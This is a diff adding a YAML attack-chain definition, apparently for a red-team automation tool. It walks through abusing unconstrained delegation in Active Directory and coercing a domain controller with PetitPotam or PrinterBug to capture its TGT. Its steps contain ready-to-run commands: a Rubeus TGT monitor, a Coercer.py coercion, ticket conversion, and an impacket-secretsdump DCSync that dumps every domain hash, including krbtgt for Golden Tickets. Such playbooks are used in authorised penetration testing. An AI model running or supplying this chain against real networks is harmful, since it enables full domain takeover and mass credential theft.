@@ -1,0 +1,72 @@
+id: unconstrained-delegation-printerbug
+name: "AD — Unconstrained delegation + PrinterBug (capture DC TGT)"
+description: >
+  When you own a host with TrustedForDelegation = TRUE, any service the
+  host receives a Kerberos ticket for hands over a usable TGT for that
+  account. PrinterBug/PetitPotam coerces the DC into authenticating to
+  you, and you walk away with the DC's TGT (and therefore DCSync rights).
+tags: [unconstrained-delegation, printerbug, petitpotam, priv-esc, kerberos]
+difficulty: hard
+
+inputs:
+  - name: dc_ip
+    source: target_context.ip
+    required: true
+  - name: domain
+    source: target_context.domain
+    required: true
+  - name: unconstrained_host
+    description: "FQDN of the host you've compromised that has unconstrained delegation."
+    required: true
+
+steps:
+  - id: confirm_unconstrained
+    name: "Confirm the host is TrustedForDelegation"
+    command_ref: nxc-ldap-find-delegation
+    inputs:
+      dc-ip: "${dc_ip}"
+    notes: |
+      Output should include `<unconstrained_host>$  Unconstrained  TrustedForDelegation`.
+      If only TRUSTED_TO_AUTH_FOR_DELEGATION appears, it's constrained, not
+      unconstrained — use the constrained-delegation chain instead.
+
+  - id: rubeus_monitor
+    name: "Start a TGT monitor on the unconstrained host"
+    inline_command: "Rubeus.exe monitor /interval:5 /filteruser:<DC_NAME>$"
+    notes: |
+      Run as SYSTEM on the compromised host. The filter limits noise to
+      DC machine-account TGTs only. Leave it running while you fire the
+      coercer from another shell.
+
+  - id: trigger_petitpotam
+    name: "PetitPotam coerce the DC to authenticate to you"
+    command_ref: nxc-smb-petitpotam
+    inputs:
+      ip: "${dc_ip}"
+    notes: |
+      If PetitPotam is patched try the PrinterBug RPC instead
+      (`Coercer.py coerce -t <dc-ip> -l <unconstrained-host-ip>`).
+      Either way the DC sends an NTLM/Kerberos auth to your monitor.
+
+  - id: extract_tgt
+    name: "Convert the captured base64 TGT → ccache"
+    inline_command: "echo '<base64_tgt_from_rubeus>' | base64 -d > dc.kirbi; ticketConverter.py dc.kirbi dc.ccache; export KRB5CCNAME=dc.ccache"
+    notes: |
+      Rubeus prints the TGT as base64; ticketConverter from Impacket turns
+      it into a ccache impacket tools accept.
+
+  - id: dcsync
+    name: "DCSync the entire domain with the DC's TGT"
+    inline_command: "impacket-secretsdump -k -no-pass -just-dc -outputfile dcsync '<domain>/<DC_NAME>$@<dc-ip>'"
+    inputs:
+      domain: "${domain}"
+      dc-ip: "${dc_ip}"
+    notes: |
+      You now hold every NTLM hash and Kerberos key in the domain,
+      including krbtgt → can mint Golden Tickets at will.
+
+references:
+  - title: "Unconstrained delegation abuse — Wagging the Dog"
+    url:   "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
+  - title: "PetitPotam"
+    url:   "https://github.com/topotam/PetitPotam"
